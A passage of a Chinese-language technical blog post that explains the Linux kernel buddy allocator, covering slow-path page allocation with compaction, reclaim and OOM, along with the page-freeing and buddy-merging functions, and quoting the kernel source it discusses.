(check_retry_cpuset(cpuset_mems_cookie, ac) ||</span><br><span class="line">    check_retry_zonelist(zonelist_iter_cookie))</span><br><span class="line"><span class="keyword">goto</span> restart;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Make sure that __GFP_NOFAIL request doesn&#x27;t leak out and make sure</span></span><br><span class="line"><span class="comment"> * we always retry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * All existing users of the __GFP_NOFAIL are blockable, so warn</span></span><br><span class="line"><span class="comment"> * of any new users that actually require GFP_NOWAIT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE_GFP(!can_direct_reclaim, gfp_mask))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PF_MEMALLOC request from this context is rather bizarre</span></span><br><span class="line"><span class="comment"> * because we cannot reclaim anything and only can loop waiting</span></span><br><span class="line"><span class="comment"> * for somebody to do a work for us</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE_GFP(current-&gt;flags &amp; PF_MEMALLOC, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * non failing costly orders are a hard requirement which we</span></span><br><span class="line"><span class="comment"> * are not prepared for much so let&#x27;s warn about these users</span></span><br><span class="line"><span class="comment"> * so that we can identify them and convert them to something</span></span><br><span class="line"><span class="comment"> * else.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE_GFP(costly_order, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Help non-failing allocations by giving some access to memory</span></span><br><span class="line"><span class="comment"> * reserves normally used for high priority non-blocking</span></span><br><span class="line"><span class="comment"> * allocations but do not use ALLOC_NO_WATERMARKS because this</span></span><br><span class="line"><span class="comment"> * could deplete whole memory reserves which would just make</span></span><br><span class="line"><span class="comment"> * the situation worse.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_MIN_RESERVE, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">fail:</span><br><span class="line">warn_alloc(gfp_mask, ac-&gt;nodemask,</span><br><span class="line"><span class="string">&quot;page allocation failure: order:%u&quot;</span>, order);</span><br><span class="line">got_pg:</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相信各位都在操作系统课程上学习过页迁移机制，在这里也简单说一下内核中的<code>Memory compaction</code>机制，就是整理内存碎片，对零散的内存页进行迁移，从而将零散的空闲内存页变成大块的空闲内存，不过这里只整理可以移动的碎片。</p><p><img   src="/images/q7T6EjtIb9PVFY3.png" ></p><p>现在开始分析一下整个函数的流程吧，首先使用原有的 gfp_flag 重新设置 alloc_flag，并重新计算<code>preferred zone</code>，若设置了 <code>ALLOC_KSWAPD</code> 则调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收。</p><p>随后直接重新尝试快速路径分配，如果成功则直接返回。</p><p>接下来调用 <code>__alloc_pages_direct_compact()</code> 进行compaction，该函数内部在整理完后会重新尝试快速路径的分配，若成功则直接返回。</p><p>随后进入retry分支调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收。</p><p>调整 zonelist 与<code>alloc_flag</code>，之后再次尝试快速路径分配，若成功则直接返回。</p><p>若 gfp_flag 中没有 <code>__GFP_DIRECT_RECLAIM</code> 或是进程 PCB 的 flag 中有 <code>PF_MEMALLOC</code>，直接跳转到nopage分支。</p><p>随后调用 <code>__alloc_pages_direct_reclaim()</code> 进行内存回收（内部调用 <code>__perform_reclaim()</code>）与快速路径分配，若成功则直接返回。</p><p>然后调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction 与快速路径分配，若成功则直接返回。</p><p>如果设置了 <code>__GFP_NORETRY</code> ，或是该次内存分配开销较高（<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>）且未设置 <code>__GFP_RETRY_MAYFAIL</code>，直接跳到nopage标签。</p><p>调用 <code>should_reclaim_retry()</code> 判断是否需要重新回收，若是则跳回retry标签。</p><p>调用 <code>should_compact_retry()</code> 判断是否需要重新进行 compaction，若是则跳回retry标签。</p><p>调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头即restart标签。</p><p>在前面的检测都没跳转则调用 <code>__alloc_pages_may_oom()</code> 尝试 kill 一些进程来释放内存，该函数内首先还是会先进行一次快速分配，之后才是调用 <code>out_of_memory()</code> 来杀掉最适合的进程以释放内存，最后若设置了 <code>__GFP_NOFAIL</code> 则调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_cpuset_fallback</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class">      <span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class">      <span class="title">const</span> <span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order,</span><br><span class="line">alloc_flags|ALLOC_CPUSET, ac);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fallback to ignore cpuset restriction if our nodes</span></span><br><span class="line"><span class="comment"> * are depleted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line">page = get_page_from_freelist(gfp_mask, order,</span><br><span class="line">alloc_flags, ac);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数中会两次走快速路径进行分配，在第一次会额外附加上 <code>ALLOC_CPUSET</code> 的 flag。</p><p>继续看<code>__alloc_pages_slowpath</code>函数流程，如果把当前进程杀掉了，跳到nopage标签，如果杀进程取得了成效，跳回retry标签。</p><p>最后进入nopage标签调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头即restart标签。</p><p>若设置了 <code>__GFP_NOFAIL</code> 则进行一系列的警告，并调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，若未成功则跳回retry标签。最后就是返回结果了。</p><p><img   src="/images/eCg12KJIZuw9aon.png" ></p><p>上面是偷的图，其实通过图能够更清晰的理清楚slow path的逻辑。</p><h2 id="上层封装的分配函数"><a href="#上层封装的分配函数" class="headerlink" title="上层封装的分配函数"></a>上层封装的分配函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_node</span>(<span class="title">int</span> <span class="title">nid</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">VM_BUG_ON(nid &lt; <span class="number">0</span> || nid &gt;= MAX_NUMNODES);</span><br><span class="line">warn_if_node_offline(nid, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> __alloc_pages(gfp_mask, order, nid, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">alloc_pages_node</span><span class="params">(<span class="keyword">int</span> nid, <span class="keyword">gfp_t</span> gfp_mask,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (nid == NUMA_NO_NODE)</span><br><span class="line">nid = numa_mem_id();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> __alloc_pages_node(nid, gfp_mask, order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">alloc_pages</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> alloc_pages_node(numa_node_id(), gfp_mask, order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __get_free_pages(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page_address(page);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_free_pages);</span><br></pre></td></tr></table></figure><p>在<code>__alloc_pages</code>上层有这样一些分配函数，只不过返回的内容不一样，在<code>__get_free_pages</code>函数返回的是虚拟地址，<code>alloc_pages</code>函数返回的是<code>page</code>结构体指针。</p><h2 id="free-one-page函数"><a href="#free-one-page函数" class="headerlink" title="__free_one_page函数"></a>__free_one_page函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Freeing function for a buddy system allocator.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The concept of a buddy system is to maintain direct-mapped table</span></span><br><span class="line"><span class="comment"> * (containing bit values) for memory blocks of various &quot;orders&quot;.</span></span><br><span class="line"><span class="comment"> * The bottom level table contains the map for the smallest allocatable</span></span><br><span class="line"><span class="comment"> * units of memory (here, pages), and each level above it describes</span></span><br><span class="line"><span class="comment"> * pairs of units from the levels below, hence, &quot;buddies&quot;.</span></span><br><span class="line"><span class="comment"> * At a high level, all that happens here is marking the table entry</span></span><br><span class="line"><span class="comment"> * at the bottom level available, and propagating the changes upward</span></span><br><span class="line"><span class="comment"> * as necessary, plus some accounting needed to play nicely with other</span></span><br><span class="line"><span class="comment"> * parts of the VM system.</span></span><br><span class="line"><span class="comment"> * At each level, we keep a list of pages, which are heads of continuous</span></span><br><span class="line"><span class="comment"> * free pages of length of (1 &lt;&lt; order) and marked with PageBuddy.</span></span><br><span class="line"><span class="comment"> * Page&#x27;s order is recorded in page_private(page) field.</span></span><br><span class="line"><span class="comment"> * So when we are allocating or freeing one, we can derive the state of the</span></span><br><span class="line"><span class="comment"> * other.  That is, if we allocate a small block, and both were</span></span><br><span class="line"><span class="comment"> * free, the remainder of the region must be split into blocks.</span></span><br><span class="line"><span class="comment"> * If a block is freed, and its buddy is also free, then this</span></span><br><span class="line"><span class="comment"> * triggers coalescing into a block of larger size.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- nyc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __free_one_page(struct page *page,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn,</span><br><span class="line">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span><br><span class="line"><span class="keyword">int</span> migratetype, <span class="keyword">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span> *<span class="title">capc</span> =</span> task_capc(zone);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> buddy_pfn = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> combined_pfn;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"><span class="keyword">bool</span> to_tail;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!zone_is_initialized(zone));</span><br><span class="line">VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(migratetype == <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (likely(!is_migrate_isolate(migratetype)))</span><br><span class="line">__mod_zone_freepage_state(zone, <span class="number">1</span> &lt;&lt; order, migratetype);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(pfn &amp; ((<span class="number">1</span> &lt;&lt; order) - <span class="number">1</span>), page);</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, page), page);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (order &lt; MAX_ORDER) &#123;</span><br><span class="line"><span class="keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">migratetype);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buddy = find_buddy_page_pfn(page, pfn, order, &amp;buddy_pfn);</span><br><span class="line"><span class="keyword">if</span> (!buddy)</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &gt;= pageblock_order)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We want to prevent merge between freepages on pageblock</span></span><br><span class="line"><span class="comment"> * without fallbacks and normal pageblock. Without this,</span></span><br><span class="line"><span class="comment"> * pageblock isolation could cause incorrect freepage or CMA</span></span><br><span class="line"><span class="comment"> * accounting or HIGHATOMIC accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> buddy_mt = get_pfnblock_migratetype(buddy, buddy_pfn);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (migratetype != buddy_mt</span><br><span class="line">&amp;&amp; (!migratetype_is_mergeable(migratetype) ||</span><br><span class="line">!migratetype_is_mergeable(buddy_mt)))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Our buddy is free or it is CONFIG_DEBUG_PAGEALLOC guard page,</span></span><br><span class="line"><span class="comment"> * merge with it and move up one order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (page_is_guard(buddy))</span><br><span class="line">clear_page_guard(zone, buddy, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">del_page_from_free_list(buddy, zone, order);</span><br><span class="line">combined_pfn = buddy_pfn &amp; pfn;</span><br><span class="line">page = page + (combined_pfn - pfn);</span><br><span class="line">pfn = combined_pfn;</span><br><span class="line">order++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done_merging:</span><br><span class="line">set_buddy_order(page, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)</span><br><span class="line">to_tail = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_shuffle_order(order))</span><br><span class="line">to_tail = shuffle_pick_tail();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (to_tail)</span><br><span class="line">add_to_free_list_tail(page, zone, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_to_free_list(page, zone, order, migratetype);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notify page reporting subsystem of freed page */</span></span><br><span class="line"><span class="keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))</span><br><span class="line">page_reporting_notify_free(order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数，主要作用是将特定页面释放到特定 zone 上，需要注意的是这里的 <code>one page</code> 不是一张页框而是一块连续内存（可能有多张页）。这是一个释放页面的基本函数，故我们需要提供待释放页面的页结构体（struct page）、页框号、页面块的阶（order）、目标 zone、迁移类型等信息——这些信息通常由上层封装函数提供，这个函数所做的只是简单地将页挂回对应链表并检查合并的操作。该函数是 buddy system 中用以进行页面释放的核心函数，所有的页面释放 API 都是基于该函数的封装。</p><p>我们将与待释放页面凑成一对的内存块称为 buddy，所谓凑成一对便是这两个内存块在物理上连续，且能凑成一个更高一阶的大内存块，由此称之为一对 buddies。</p><p>接下来开始分析一下这个函数的基本流程：</p><p>首先这里通过<code>find_buddy_page_pfn</code>函数寻找并检查buddy。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">find_buddy_page_pfn</span><span class="params">(struct page *page,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn, <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buddy_pfn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"></span><br><span class="line">buddy = page + (__buddy_pfn - pfn);</span><br><span class="line"><span class="keyword">if</span> (buddy_pfn)</span><br><span class="line">*buddy_pfn = __buddy_pfn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (page_is_buddy(page, buddy, order))</span><br><span class="line"><span class="keyword">return</span> buddy;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会根据待释放堆块的pfn和order寻找到buddy的pfn，随后通过计算或得到buddy的page指针，随后调用<code>page_is_buddy</code>来判断是否满足buddy条件。主要是以下四个条件：</p><ul><li>buddy 不在空洞中</li><li>buddy 在 buddy system 中（即 buddy 也是空闲内存块）</li><li>待释放页面与其 buddy 在同一个 zone 中</li><li>待释放页面与其 buddy 有着同样的阶（order）</li></ul><p>随后进行判断如果order达到了<code>pageblock_order</code>那么就意味着常规的<code>pageblock</code>可能会与独立的<code>pageblock</code>进行合并，为了预防这一现象，内核在这里存在一处判断，即<code>if (unlikely(order &gt;= pageblock_order)) &#123;</code>这里会判断所选择的buddy是否为mergeable，如果是可以继续增加order，如果不是则直接进入到<code>done_merging</code>标签。</p><p>循环最后验证此buddy 是否为 guard page，如果是则调用 <code>clear_page_guard()</code> 清除这个属性让其变成空闲页面，这里清除的操作是通过将 page 结构体的 private 字段置 0 实现的；若否，则说明是常规的空闲页面，调用 <code>del_page_from_free_list()</code> 将其脱链。</p><p>经过前面的操作后我们的新的高阶内存块就完成合成了，接下来我们回到循环开头重新寻找这个合成的新内存块的 buddy，这个循环一直持续到 <code>max_order</code> （一般是10），作为下一次循环的页框号的计算方式是 <code>buddy_pfn &amp; pfn</code>，之后做指针运算 <code>page + (combined_pfn - pfn)</code> 找到对应的 page 结构体。</p><p>最后进入到<code>done_merging</code>标签，这一步主要是调用 <code>set_buddy_order()</code> 在 page 结构体的 private 字段存放该内存块的 order，若是设置了 <code>FPI_TO_TAIL</code> flag，则将 <code>to_tail</code> 置为 true；否则，若内存块的 <code>order &gt;= SHUFFLE_ORDER</code>（<code>MAX_ORDER - 1</code>），则将 <code>to_tail</code> 置为随机结果（<code>shuffle_pick_tail()</code>）；否则置为调用 <code>buddy_merge_likely()</code> 的结果，该函数会检查是否下一个最高阶的 buddy 是否空闲，若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部，这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面。若 <code>to_tail</code> 为真，则调用 <code>add_to_free_list_tail()</code> 将该空闲页添加到链表末尾，否则调用 <code>add_to_free_list()</code> 添加到链表开头。</p><h2 id="上层封装的释放函数"><a href="#上层封装的释放函数" class="headerlink" title="上层封装的释放函数"></a>上层封装的释放函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __free_pages_ok(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span><br><span class="line">    <span class="keyword">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">int</span> migratetype;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pfn = page_to_pfn(page);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span> =</span> page_zone(page);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!free_pages_prepare(page, order, fpi_flags))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Calling get_pfnblock_migratetype() without spin_lock_irqsave() here</span></span><br><span class="line"><span class="comment"> * is used to avoid calling get_pfnblock_migratetype() under the lock.</span></span><br><span class="line"><span class="comment"> * This will reduce the lock holding time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">migratetype = get_pfnblock_migratetype(page, pfn);</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(has_isolate_pageblock(zone) ||</span><br><span class="line">is_migrate_isolate(migratetype))) &#123;</span><br><span class="line">migratetype = get_pfnblock_migratetype(page, pfn);</span><br><span class="line">&#125;</span><br><span class="line">__free_one_page(page, pfn, zone, order, migratetype, fpi_flags);</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">__count_vm_events(PGFREE, <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">free_the_page</span><span class="params">(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (pcp_allowed_order(order))<span class="comment">/* Via pcp? */</span></span><br><span class="line">free_unref_page(page, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">__free_pages_ok(page, order, FPI_NONE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __free_pages(struct page *page, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* get PageHead before we drop reference */</span></span><br><span class="line"><span class="keyword">int</span> head = PageHead(page);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">free_the_page(page, order);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!head)</span><br><span class="line"><span class="keyword">while</span> (order-- &gt; <span class="number">0</span>)</span><br><span class="line">free_the_page(page + (<span class="number">1</span> &lt;&lt; order), order);</span><br><span class="line">&#125;</span><br><span 